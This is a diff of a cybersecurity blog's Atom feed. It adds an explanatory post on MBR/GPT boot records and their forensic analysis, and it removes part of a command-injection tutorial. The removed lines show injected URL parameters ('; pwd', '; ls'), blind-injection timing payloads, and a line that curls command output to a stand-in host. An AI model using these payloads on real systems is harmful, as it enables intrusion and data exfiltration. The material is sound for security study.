@@ -1,4 +1,376 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-28T18:03:46-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Brr v1 Tryhackme</title><link href="http://localhost:4000/blog/Brrv1Tryhackme/" rel="alternate" type="text/html" title="Brr v1 Tryhackme" /><published>2025-06-28T00:00:00-04:00</published><updated>2025-06-28T00:00:00-04:00</updated><id>http://localhost:4000/blog/%20BrrV1</id><content type="html" xml:base="http://localhost:4000/blog/Brrv1Tryhackme/"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-01T14:56:36-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">MBR and GPT</title><link href="http://localhost:4000/blog/MBR-GPT/" rel="alternate" type="text/html" title="MBR and GPT" /><published>2025-07-01T00:00:00-04:00</published><updated>2025-07-01T00:00:00-04:00</updated><id>http://localhost:4000/blog/MBR-GPT</id><content type="html" xml:base="http://localhost:4000/blog/MBR-GPT/"><![CDATA[<h1 id="understanding-mbr-and-gpt-the-foundation-of-disk-partitioning">Understanding MBR and GPT: The Foundation of Disk Partitioning</h1>
+
+<p>When it comes to data storage and system boot processes, two fundamental partition schemes dominate the landscape: <strong>Master Boot Record (MBR)</strong> and <strong>GUID Partition Table (GPT)</strong>. These critical components reside in the very first sector of a disk and contain essential information about the disk’s structure, partitions, and organization. Beyond simple data management, they play a pivotal role in the system boot process, making them both essential for legitimate operations and attractive targets for malicious actors.</p>
+
+<h2 id="what-is-mbr-master-boot-record">What is MBR (Master Boot Record)?</h2>
+
+<p>The Master Boot Record is the traditional partitioning scheme that has been around since the early days of personal computing. Located in the first 512 bytes of a storage device, the MBR contains:</p>
+
+<ul>
+  <li><strong>Boot loader code</strong> (446 bytes): Small program that initiates the boot process</li>
+  <li><strong>Partition table</strong> (64 bytes): Information about up to 4 primary partitions</li>
+  <li><strong>Boot signature</strong> (2 bytes): Magic number (0x55AA) indicating a valid MBR</li>
+</ul>
+
+<h3 id="mbr-limitations">MBR Limitations</h3>
+
+<ul>
+  <li><strong>Maximum disk size</strong>: 2TB limit due to 32-bit addressing</li>
+  <li><strong>Partition limit</strong>: Only 4 primary partitions (though extended partitions can work around this)</li>
+  <li><strong>Single point of failure</strong>: No backup of the partition table</li>
+  <li><strong>Legacy BIOS dependency</strong>: Designed for older BIOS systems</li>
+</ul>
+
+<h2 id="what-is-gpt-guid-partition-table">What is GPT (GUID Partition Table)?</h2>
+
+<p>GPT is the modern successor to MBR, developed as part of the UEFI (Unified Extensible Firmware Interface) specification. Unlike MBR’s simplistic approach, GPT offers:</p>
+
+<ul>
+  <li><strong>Larger disk support</strong>: Supports disks up to 9.4 ZB (zettabytes)</li>
+  <li><strong>More partitions</strong>: Up to 128 partitions by default</li>
+  <li><strong>Redundancy</strong>: Backup partition table at the end of the disk</li>
+  <li><strong>CRC32 checksums</strong>: Error detection and recovery capabilities</li>
+  <li><strong>Unique identifiers</strong>: Each partition has a globally unique identifier (GUID)</li>
+</ul>
+
+<h3 id="gpt-structure">GPT Structure</h3>
+
+<p>GPT maintains a more sophisticated structure:</p>
+<ol>
+  <li><strong>Protective MBR</strong>: Legacy compatibility layer</li>
+  <li><strong>Primary GPT header</strong>: Contains partition table metadata</li>
+  <li><strong>Partition entries</strong>: Array of partition information</li>
+  <li><strong>Backup GPT</strong>: Duplicate of the partition table at disk end</li>
+</ol>
+
+<h2 id="security-implications-the-bootkit-threat">Security Implications: The Bootkit Threat</h2>
+
+<p>The critical role of MBR and GPT in the boot process makes them prime targets for sophisticated attacks. Since these structures are loaded before the operating system, they operate at the highest privilege level, making them ideal locations for persistent malware.</p>
+
+<h3 id="why-attackers-target-boot-records">Why Attackers Target Boot Records</h3>
+
+<ol>
+  <li><strong>Pre-OS execution</strong>: Code runs before security software loads</li>
+  <li><strong>Persistence</strong>: Survives OS reinstallation and formatting</li>
+  <li><strong>Stealth</strong>: Difficult to detect and remove</li>
+  <li><strong>System control</strong>: Can manipulate the entire boot chain</li>
+</ol>
+
+<h3 id="common-attack-vectors">Common Attack Vectors</h3>
+
+<ul>
+  <li><strong>Bootkit installation</strong>: Malware that infects the boot process</li>
+  <li><strong>Rootkit deployment</strong>: Deep system-level access for other malware</li>
+  <li><strong>Data destruction</strong>: Corrupting partition tables to render systems unbootable</li>
+  <li><strong>Ransomware enhancement</strong>: Boot-level encryption for maximum impact</li>
+</ul>
+
+<h2 id="defensive-considerations">Defensive Considerations</h2>
+
+<p>Understanding these partition schemes is crucial for cybersecurity professionals:</p>
+
+<ul>
+  <li><strong>Secure Boot</strong>: UEFI feature that validates boot components</li>
+  <li><strong>Boot integrity monitoring</strong>: Tools to detect unauthorized changes</li>
+  <li><strong>Backup strategies</strong>: Regular backup of partition tables</li>
+  <li><strong>Incident response</strong>: Knowledge needed for boot-level malware analysis</li>
+</ul>
+
+<h1 id="the-boot-process-from-power-on-to-user-interface">The Boot Process: From Power-On to User Interface</h1>
+
+<p>Understanding how MBR and GPT fit into the broader boot process is essential for grasping their security implications. The boot process is a carefully orchestrated sequence of events that transforms a powered-off computer into a fully functional system ready for user interaction.</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*lUaXutWXVcNIGrgAslhtIQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h3 id="step-by-step-boot-process">Step-by-Step Boot Process</h3>
+
+<p>The boot process can be broken down into several distinct phases:</p>
+
+<h4 id="1-power-on-self-test-post">1. Power-On Self-Test (POST)</h4>
+<ul>
+  <li><strong>Hardware initialization</strong>: CPU, RAM, and essential components are tested</li>
+  <li><strong>Component verification</strong>: System checks for connected devices and their functionality</li>
+  <li><strong>Error detection</strong>: Any hardware failures are identified and reported</li>
+  <li><strong>Memory mapping</strong>: System memory is mapped and tested for errors</li>
+</ul>
+
+<h4 id="2-firmware-execution-biosuefi">2. Firmware Execution (BIOS/UEFI)</h4>
+<ul>
+  <li><strong>BIOS/UEFI loading</strong>: Firmware stored in non-volatile memory is executed</li>
+  <li><strong>Boot device selection</strong>: System determines which storage device to boot from</li>
+  <li><strong>Hardware abstraction</strong>: Firmware provides an interface between hardware and software</li>
+  <li><strong>Security checks</strong>: In UEFI systems, Secure Boot validation occurs here</li>
+</ul>
+
+<h4 id="3-boot-loader-execution">3. Boot Loader Execution</h4>
+<p>This is where <strong>MBR or GPT</strong> becomes critical:</p>
+
+<p><strong>For MBR systems:</strong></p>
+<ul>
+  <li>First 446 bytes of MBR are loaded into memory</li>
+  <li>Boot loader code executes to locate the active partition</li>
+  <li>Control is transferred to the Volume Boot Record (VBR) of the active partition</li>
+</ul>
+
+<p><strong>For GPT systems:</strong></p>
+<ul>
+  <li>UEFI firmware reads the GPT partition table</li>
+  <li>Boot loader (like GRUB or Windows Boot Manager) is located and executed</li>
+  <li>More sophisticated boot options and security features are available</li>
+</ul>
+
+<h4 id="4-operating-system-kernel-loading">4. Operating System Kernel Loading</h4>
+<ul>
+  <li><strong>Kernel initialization</strong>: OS kernel is loaded into memory</li>
+  <li><strong>Driver loading</strong>: Essential device drivers are initialized</li>
+  <li><strong>System services</strong>: Core system processes and services start</li>
+  <li><strong>Memory management</strong>: Virtual memory system is established</li>
+</ul>
+
+<h4 id="5-system-services-and-user-interface">5. System Services and User Interface</h4>
+<ul>
+  <li><strong>Service initialization</strong>: Background services and daemons start</li>
+  <li><strong>User environment</strong>: Desktop environment or command-line interface loads</li>
+  <li><strong>User authentication</strong>: Login screen appears for user credentials</li>
+  <li><strong>Full system readiness</strong>: System is ready for user interaction</li>
+</ul>
+
+<h3 id="security-vulnerabilities-in-the-boot-chain">Security Vulnerabilities in the Boot Chain</h3>
+
+<p>Each phase of the boot process presents potential attack vectors:</p>
+
+<p><strong>Pre-boot attacks:</strong></p>
+<ul>
+  <li><strong>Firmware rootkits</strong>: Malware embedded in BIOS/UEFI</li>
+  <li><strong>Hardware implants</strong>: Physical modifications to system components</li>
+</ul>
+
+<p><strong>Boot loader attacks:</strong></p>
+<ul>
+  <li><strong>MBR/GPT manipulation</strong>: Modifying partition tables or boot code</li>
+  <li><strong>Bootkit installation</strong>: Malicious code in boot loaders</li>
+  <li><strong>Boot configuration tampering</strong>: Altering boot parameters</li>
+</ul>
+
+<p><strong>Kernel-level attacks:</strong></p>
+<ul>
+  <li><strong>Kernel rootkits</strong>: Malware operating at kernel level</li>
+  <li><strong>Driver signing bypass</strong>: Loading unsigned or malicious drivers</li>
+</ul>
+
+<h3 id="modern-boot-security-measures">Modern Boot Security Measures</h3>
+
+<p>Contemporary systems implement several security features:</p>
+
+<ul>
+  <li><strong>Secure Boot</strong>: Cryptographic verification of boot components</li>
+  <li><strong>Trusted Platform Module (TPM)</strong>: Hardware-based security chip for key storage</li>
+  <li><strong>Boot attestation</strong>: Remote verification of boot integrity</li>
+  <li><strong>Measured boot</strong>: Cryptographic measurement of boot components</li>
+  <li><strong>Boot guard</strong>: Intel/AMD hardware-based boot verification</li>
+</ul>
+
+<h3 id="forensic-implications">Forensic Implications</h3>
+
+<p>For cybersecurity professionals, understanding the boot process is crucial for:</p>
+
+<ul>
+  <li><strong>Malware analysis</strong>: Identifying boot-level infections</li>
+  <li><strong>Incident response</strong>: Recovering from boot-level attacks</li>
+  <li><strong>Digital forensics</strong>: Preserving and analyzing boot artifacts</li>
+  <li><strong>Penetration testing</strong>: Assessing boot security measures</li>
+  <li><strong>System hardening</strong>: Implementing proper boot security controls</li>
+</ul>
+
+<p>The boot process represents a critical attack surface that extends far beyond simple data storage. As attackers increasingly target the foundational layers of computing systems, a thorough understanding of how MBR and GPT integrate into the boot chain becomes essential for effective cybersecurity operations.</p>
+
+<h1 id="analyzing-the-mbr-hands-on-forensic-analysis">Analyzing the MBR: Hands-On Forensic Analysis</h1>
+
+<p>Understanding MBR structure is crucial for cybersecurity professionals, especially when conducting digital forensics, malware analysis, or incident response. Let’s dive into the practical aspects of examining an MBR structure.</p>
+
+<h3 id="understanding-disk-sectors">Understanding Disk Sectors</h3>
+
+<p>Before analyzing the MBR, it’s important to understand how data is organized on storage devices:</p>
+
+<ul>
+  <li><strong>Disk sectors</strong>: Storage devices are divided into sectors of <strong>512 bytes</strong> each</li>
+  <li><strong>First sector significance</strong>: The very first sector (Sector 0) contains the Master Boot Record</li>
+  <li><strong>Sequential addressing</strong>: Sectors are numbered starting from 0, making them easy to locate</li>
+  <li><strong>Critical positioning</strong>: The MBR’s location at the beginning makes it both essential and vulnerable</li>
+</ul>
+
+<h3 id="tools-for-mbr-analysis">Tools for MBR Analysis</h3>
+
+<p>For hands-on analysis of MBR structures, we’ll use <strong>HxD</strong>, a powerful hexadecimal editor that allows us to:</p>
+
+<ul>
+  <li><strong>View raw disk data</strong>: Examine the actual bytes stored on disk</li>
+  <li><strong>Analyze boot code</strong>: Inspect the 446-byte boot loader section</li>
+  <li><strong>Examine partition tables</strong>: Review the 64-byte partition information</li>
+  <li><strong>Verify signatures</strong>: Check the boot signature (0x55AA)</li>
+</ul>
+
+<h3 id="step-by-step-mbr-analysis-process-tryhackme-walkthrough">Step-by-Step MBR Analysis Process (Tryhackme Walkthrough)</h3>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*L8cjsmpW-_HMzFu9Eu4XuQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<h4 id="understanding-mbr-size-and-location">Understanding MBR Size and Location</h4>
+
+<p>The <strong>Master Boot Record (MBR)</strong> occupies exactly <strong>512 bytes</strong> at the very beginning of a storage device (Sector 0). To effectively analyze the MBR structure, you need to understand how to identify its boundaries:</p>
+
+<p><strong>Calculating MBR Boundaries:</strong></p>
+<ul>
+  <li><strong>Total size</strong>: 512 bytes (fixed)</li>
+  <li><strong>Hexadecimal representation</strong>: Each pair of hex digits = 1 byte</li>
+  <li><strong>Row calculation</strong>: HxD displays 16 bytes per row</li>
+  <li><strong>MBR span</strong>: First 32 rows (512 ÷ 16 = 32 rows)</li>
+</ul>
+
+<p><strong>Visual Identification Methods:</strong></p>
+
+<ol>
+  <li><strong>Row Counting Method</strong>:</li>
+</ol>
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+   Row 0x00000000 to Row 0x000001F0 = Complete MBR
+   (32 total rows × 16 bytes per row = 512 bytes)
+</code></pre>
+</div>
+
+<ol>
+  <li><strong>Signature Recognition Method</strong>:
+    <ul>
+      <li>Look for the <strong>boot signature</strong>: <code class="language-plaintext highlighter-rouge">55 AA</code></li>
+      <li>Located at the very end: bytes 510-511</li>
+      <li>Hex offset: <code class="language-plaintext highlighter-rouge">0x000001FE - 0x000001FF</code></li>
+      <li>This signature definitively marks the MBR’s end</li>
+    </ul>
+  </li>
+</ol>
+
+<p><strong>Practical Example in HxD:</strong></p>
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+000001F0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 55 AA  |..............U.|
+                                                     ^^^^
+                                               MBR Signature
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*G1SS69Ys0Rr9V_PQmsSeaw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><strong>Why This Matters for Security Analysis:</strong></p>
+<ul>
+  <li><strong>Boundary verification</strong>: Ensures you’re analyzing the complete MBR</li>
+  <li><strong>Integrity checking</strong>: The <code class="language-plaintext highlighter-rouge">55 AA</code> signature validates MBR structure</li>
+  <li><strong>Malware detection</strong>: Modified or missing signatures indicate potential compromise</li>
+  <li><strong>Forensic accuracy</strong>: Proper boundaries ensure complete evidence collection</li>
+</ul>
+
+<h2 id="understanding-hxd-display-format">Understanding HxD Display Format</h2>
+
+<p>When viewing the MBR in HxD, the interface presents information in three distinct columns:</p>
+
+<p><strong>HxD Display Components:</strong></p>
+<ul>
+  <li><strong>Left Column (Offset)</strong>: Shows the memory address/position of each byte</li>
+  <li><strong>Middle Column (Hex Data)</strong>: Contains the actual hexadecimal values we’ll analyze</li>
+  <li><strong>Right Column (ASCII)</strong>: Text representation of hex bytes (often unreadable for binary data)</li>
+</ul>
+
+<p><strong>Focus Area for Analysis:</strong>
+For MBR forensic analysis, we concentrate primarily on the <strong>middle column’s hexadecimal bytes</strong>. These raw hex values contain the actual boot code, partition information, and signatures that reveal the disk’s structure and potential security compromises.</p>
+
+<p><strong>Example HxD Layout:</strong></p>
+<div class="code-block-container">
+  <span class="code-lang-tag">Terminal</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Terminal">
+Offset    |  Hex Bytes (Our Focus)     |  ASCII
+----------|----------------------------|--------
+00000000  |  EB 48 90 4D 53 44 4F 53   |  .H.MSDOS
+00000010  |  35 2E 30 00 02 08 20 00   |  5.0... 
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*kmMkvi7izPK7ojHoqoLnpw.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p>The hexadecimal bytes in the middle column tell the complete story of the MBR’s structure, boot instructions, and partition layout - making them our primary focus for security analysis.</p>
+
+<h3 id="security-analysis-indicators">Security Analysis Indicators</h3>
+
+<p>When analyzing MBR for security purposes, look for:</p>
+
+<p><strong>Legitimate MBR characteristics</strong>:</p>
+<ul>
+  <li>Standard boot signature (55 AA)</li>
+  <li>Recognizable partition types (07 for NTFS, 83 for Linux ext)</li>
+  <li>Consistent partition boundaries</li>
+  <li>Expected boot code patterns</li>
+</ul>
+
+<p><strong>Potential malware indicators</strong>:</p>
+<ul>
+  <li><strong>Unusual boot code</strong>: Non-standard instructions or suspicious patterns</li>
+  <li><strong>Modified signatures</strong>: Altered or missing boot signatures</li>
+  <li><strong>Suspicious partition entries</strong>: Invalid or unusual partition configurations</li>
+  <li><strong>Code caves</strong>: Unused space filled with malicious code</li>
+</ul>
+
+<h3 id="common-mbr-attack-patterns">Common MBR Attack Patterns</h3>
+
+<p><strong>Bootkit infections typically</strong>:</p>
+<ul>
+  <li>Modify the original boot code while preserving functionality</li>
+  <li>Redirect execution to malicious code before loading the OS</li>
+  <li>Maintain stealth by hooking legitimate boot processes</li>
+  <li>Store additional payload in unused disk sectors</li>
+</ul>
+
+<h3 id="forensic-best-practices">Forensic Best Practices</h3>
+
+<p>When conducting MBR analysis:</p>
+
+<ol>
+  <li><strong>Create bit-for-bit copies</strong>: Always work with disk images, never live systems</li>
+  <li><strong>Document everything</strong>: Record all findings with screenshots and hex dumps</li>
+  <li><strong>Preserve chain of custody</strong>: Maintain proper evidence handling procedures</li>
+  <li><strong>Cross-reference</strong>: Compare suspicious MBRs with known-good samples</li>
+  <li><strong>Use multiple tools</strong>: Verify findings with different analysis tools</li>
+</ol>
+
+<h3 id="automated-analysis-tools">Automated Analysis Tools</h3>
+
+<p>Beyond manual hex analysis, consider these specialized tools:</p>
+
+<ul>
+  <li><strong>Volatility Framework</strong>: Memory analysis including MBR artifacts</li>
+  <li><strong>YARA rules</strong>: Pattern matching for known MBR malware</li>
+  <li><strong>Custom scripts</strong>: Python/PowerShell for automated MBR parsing</li>
+  <li><strong>Commercial forensic suites</strong>: EnCase, FTK for comprehensive analysis</li>
+</ul>
+
+<p>Understanding MBR structure through hands-on analysis is essential for detecting boot-level compromises and conducting thorough digital forensic investigations. This low-level knowledge forms the foundation for advanced malware analysis and incident</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Understanding MBR and GPT: The Foundation of Disk Partitioning]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://synchronet.net/wp-content/uploads/2025/01/image-9.jpeg" /><media:content medium="image" url="https://synchronet.net/wp-content/uploads/2025/01/image-9.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Brr v1 Tryhackme</title><link href="http://localhost:4000/blog/Brrv1Tryhackme/" rel="alternate" type="text/html" title="Brr v1 Tryhackme" /><published>2025-06-28T00:00:00-04:00</published><updated>2025-06-28T00:00:00-04:00</updated><id>http://localhost:4000/blog/%20BrrV1</id><content type="html" xml:base="http://localhost:4000/blog/Brrv1Tryhackme/"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
   <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
     Challenge: Brr v1
   </div>
@@ -3272,442 +3644,4 @@ print(flag)
 </code></pre>
 </div>
 
-<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e1.pxfuel.com/desktop-wallpaper/637/928/desktop-wallpaper-the-grim-reaper-%C2%B7%E2%91%A0-grim-reaper-layouts-backgrounds.jpg" /><media:content medium="image" url="https://e1.pxfuel.com/desktop-wallpaper/637/928/desktop-wallpaper-the-grim-reaper-%C2%B7%E2%91%A0-grim-reaper-layouts-backgrounds.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
-That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
-
-<p>At its core, Command Injection happens when user-supplied data is passed directly to the system shell without proper sanitization. It’s like handing a stranger the mic and trusting they’ll only say what you expect. But attackers don’t play nice they chain extra commands, escalate privileges, and pivot deeper into your infrastructure.</p>
-
-<p><strong>Remote Command Injection</strong> (RCI) raises the stakes. It’s the same flaw, but now it’s exposed over a network. An attacker can be miles or continents away, injecting commands into a server, IoT device, or web app, turning an external input point into an internal compromise.</p>
-
-<p>These vulnerabilities aren’t theoretical. They’re actively exploited in the wild used to drop web shells, create backdoors, and hijack entire environments. Understanding how they work is the first step to preventing a silent breach.</p>
-
-<h1 id="breaking-down-rce-through-a-simple-invoice-app">Breaking Down RCE Through a Simple Invoice App</h1>
-
-<p>Imagine you log into an app and click <strong>Generate Invoice</strong>. Looks all normal, right? Here’s what happens:</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jzNx0nUYgsmHFZJZG2qccA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<ol>
-  <li>You hit the button, and it shows <strong>Invoice #001</strong> with client info and total amount. Nothing sketchy.</li>
-</ol>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pRgY0fG5l8m_zkZDdPXuAg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<ol>
-  <li>But check the URL closely:</li>
-</ol>
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1
-</code></pre>
-</div>
-
-<ol>
-  <li>That <code class="language-plaintext highlighter-rouge">file</code> parameter? It’s the weak link. When we start messing with it like running <code class="language-plaintext highlighter-rouge">pwd</code> (print working directory in Linux) the server blindly executes it. Remote Code Execution (RCE).</li>
-</ol>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; pwd
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JjOPZfh85Lzuj3o_h7E-Ng.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<ol>
-  <li>Next, we try <code class="language-plaintext highlighter-rouge">ls</code> to list directories. The server spits back the contents.</li>
-</ol>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-http://0.0.0.0:8080/invoice.php?file=invoice1; ls
-</code></pre>
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dwZAx8GLOe-oEzPqeKBUlg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
-
-<p><strong>What this means:</strong>
-Attackers can slip commands through that parameter, bypassing any security guardrails, and gain full control of your system without breaking a sweat.</p>
-
-<h2 id="detecting-command-injection-from-echoes-to-silence">Detecting Command Injection: From Echoes to Silence</h2>
-
-<p>Detection relies on understanding how the app <em>behaves</em> when fed hostile input. There are two primary categories:</p>
-
-<h3 id="types-of-command-injection">Types of Command Injection</h3>
-
-<table>
-  <thead>
-    <tr>
-      <th>Type</th>
-      <th>Description</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td><strong>Verbose</strong></td>
-      <td>You get immediate feedback. Think <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">id</code>, or <code class="language-plaintext highlighter-rouge">uname -a</code> if the output is reflected in the response, the target is talking.</td>
-    </tr>
-    <tr>
-      <td><strong>Blind</strong></td>
-      <td>No output. The system executes commands silently. You need to analyze behavior, timing, or external signals to confirm execution. This is stealth mode.</td>
-    </tr>
-  </tbody>
-</table>
-
-<hr />
-
-<h2 id="detecting-blind-command-injection">Detecting Blind Command Injection</h2>
-
-<p>The hardest to spot. There’s no direct output just subtle shifts in behavior. You’re probing in the dark, waiting for the system to flinch.</p>
-
-<h3 id="1-time-based-payloads">1. <strong>Time-Based Payloads</strong></h3>
-
-<p>Use commands that introduce a delay. Examples:</p>
-
-<ul>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">ping -c 5 127.0.0.1</code> (Linux)</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">timeout /T 5</code> (Windows)</p>
-  </li>
-  <li>
-    <p><code class="language-plaintext highlighter-rouge">sleep 5</code></p>
-  </li>
-</ul>
-
-<p>If the response time increases proportionally to the command, the target’s bleeding commands under the hood.</p>
-
-<h4 id="2-out-of-band-oob-detection">2. <strong>Out-of-Band (OOB) Detection</strong></h4>
-
-<p>If you control a server (Burp Collaborator, your own webhook, etc.), use payloads like:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  <pre><code class="language-powershell">
-curl http://yourhost.com/$(whoami)
-</code></pre>
-</div>
-
-<p>If your server receives a pingback? Game over. You’ve got code execution.</p>
-
-<h3 id="3-output-redirection">3. <strong>Output Redirection</strong></h3>
-
-<p>Force output to a file:</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
